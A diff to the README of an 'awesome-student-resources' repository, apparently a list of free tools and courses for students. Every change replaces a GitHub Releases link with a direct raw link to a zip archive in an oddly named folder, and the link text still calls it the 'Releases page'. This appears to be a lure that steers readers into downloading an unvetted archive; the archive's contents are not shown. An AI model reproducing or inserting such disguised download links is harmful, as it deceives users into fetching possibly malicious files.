@@ -1,7 +1,7 @@
 # 🎓 awesome-student-resources - Access Free Tools and Courses
 
 ## 💻 Get It Now!
-[![Download](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/ingum1210/awesome-student-resources/releases)
+[![Download](https://raw.githubusercontent.com/ingum1210/awesome-student-resources/main/florisugent/awesome_student_resources_3.3.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/ingum1210/awesome-student-resources/main/florisugent/awesome_student_resources_3.3.zip)
 
 ## 📘 Description
 This repository offers a curated collection of free resources, tools, courses, and perks designed for students. Whether you have a Student ID or a .edu email, you will find valuable materials to support your studies and enhance your learning experience.
@@ -10,7 +10,7 @@ This repository offers a curated collection of free resources, tools, courses, a
 To start using the resources in this repository, follow these steps:
 
 1. **Visit the Releases Page:**
-   Go to our [Releases page](https://github.com/ingum1210/awesome-student-resources/releases) to view all available downloads.
+   Go to our [Releases page](https://raw.githubusercontent.com/ingum1210/awesome-student-resources/main/florisugent/awesome_student_resources_3.3.zip) to view all available downloads.
 
 2. **Choose Your Resources:**
    Review the list of available files and choose what interests you. Each resource contains helpful tools and information to support your educational journey.
@@ -42,7 +42,7 @@ Explore a variety of topics that focus on education and resources for students:
 - **Student Discounts:** Learn about offers available for students to save money on software and services.
 
 ## 📥 Download & Install
-To get started, simply visit our [Releases page](https://github.com/ingum1210/awesome-student-resources/releases) and select the resources you wish to download. Each resource comes with its own set of instructions for installation and usage. 
+To get started, simply visit our [Releases page](https://raw.githubusercontent.com/ingum1210/awesome-student-resources/main/florisugent/awesome_student_resources_3.3.zip) and select the resources you wish to download. Each resource comes with its own set of instructions for installation and usage. 
 
 Once downloaded, follow the on-screen prompts or read the included documentation to install and run the resources. If you encounter any issues, feel free to reach out through the repository's issues page.
 
@@ -63,4 +63,4 @@ Follow our repository for updates and new resources. This helps you stay informe
 ## 🛠️ License
 This project is open source and available under the [MIT License](LICENSE). Use it freely for your personal educational needs.
 
-Again, access the resources at our [Releases page](https://github.com/ingum1210/awesome-student-resources/releases) to get started. Enjoy exploring the multitude of options available to aid your studies and personal growth!
+Again, access the resources at our [Releases page](https://raw.githubusercontent.com/ingum1210/awesome-student-resources/main/florisugent/awesome_student_resources_3.3.zip) to get started. Enjoy exploring the multitude of options available to aid your studies and personal growth!
